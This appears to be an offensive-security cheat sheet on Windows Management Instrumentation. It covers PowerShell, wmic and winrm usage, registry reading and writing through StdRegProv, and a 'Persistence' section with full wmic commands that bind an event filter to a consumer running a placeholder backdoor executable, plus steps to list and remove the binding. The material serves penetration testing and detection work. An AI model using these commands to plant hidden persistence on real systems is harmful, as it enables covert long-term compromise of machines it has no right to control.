# WMI
https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
## Interacting with it
1. Powershell
```
Get-WmiObject
Get-CimAssociatedInstance
Get-CimClass
Get-CimInstance
Get-CimSession
Set-WmiInstance
Set-CimInstance
Invoke-WmiMethod
Invoke-CimMethod
New-CimInstance
New-CimSession
New-CimSessionOption
Register-CimIndicationEvent
Register-WmiEvent
Remove-CimInstance
Remove-WmiObject
Remove-CimSession
```
2. wmic
3. Wbemtest.exe
Shitty GUI but Windows native and useful if Powershell and wmic are blacklisted ;)
4. WSH (VBScript or JScript)
5. C/C++ calls IWbem* COM API
6. NET System.Management class
For C#, VB.Net, and F#
7. WinRM
```
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe";CurrentDirectory="C:\"}
winrm enumerate http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process
winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem
```

## Remote use of WMI
1. DCOM
2. WinRM

## Information gathering
- Get operating system related information:
```
wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem GET /all /FORMAT:list
```

## Play with registry
### Special characters
https://msdn.microsoft.com/en-us/library/aa393664(VS.85).aspx
- &H80000000 -> HKEY_CLASSES_ROOT
- &H80000001 -> HKEY_CURRENT_USER
- &H80000002 -> HKEY_LOCAL_MACHINE
- &H80000003 -> HKEY_USERS
- &H80000005 -> HKEY_CURRENT_CONFIG

### Keys and values for the following examples
- Keys:
```
Computer
  HKEY_LOCAL_MACHINE
    SOFTWARE
      Microsoft
        Windows
          CurrentVersion
            RenameFiles
              Sys
```

- Values:
```
Name        Type            Data
(Default)   REG_EXPAND_SZ   %systemroot%\ime\shared
TasksDir    REG_SZ          TASKS,4
```

### Enumerating keys
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumKey ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles"
-> "Sys"
```

### Enumerating the specified key values
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumValues ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys"
-> "", "TasksDir"
```

### Getting the string data value of the specified key value
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call GetStringValue ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys","TasksDir"
-> "TASKS,4"
```

### Creating a subkey (Admin rights required)
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call CreateKey ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\lulz"
```

### Creating or modifying the value of a key value (Admin rights required)
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call SetStringValue ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\lulz","pwn","1337"
```

### Deleting a key value:
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteValue ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\lulz","pwn"
```

### Deleting a subkey (Admin rights required)
```
wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteKey ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\lulz"
```

## Persistence
### Creation
1. Creating an *__EventFilter* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="LulzFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

2. Creating an *__EventConsumer* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LulzConsumer", ExecutablePath="C:\<path>\<backdoor.exe>",CommandLineTemplate="C:\<path>\<backdoor.exe>"
```

3. Creating an *__FilterToConsumerBinding* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"LulzFilter\"", Consumer="CommandLineEventConsumer.Name=\"LulzConsumer\""
```

### Listing
1. Listing the *__EventFilter* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list
```

2. Listing the *__EventConsumer* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list
```

3. Listing the *__FilterToConsumerBinding* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list
```

### Deletion
1. Removing the *__EventFilter* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="LulzFilter" DELETE
```

2. Removing the *__EventConsumer* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LulzConsumer" DELETE
```

3. Removing the *__FilterToConsumerBinding* instance
```
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='LulzFilter'" DELETE
```
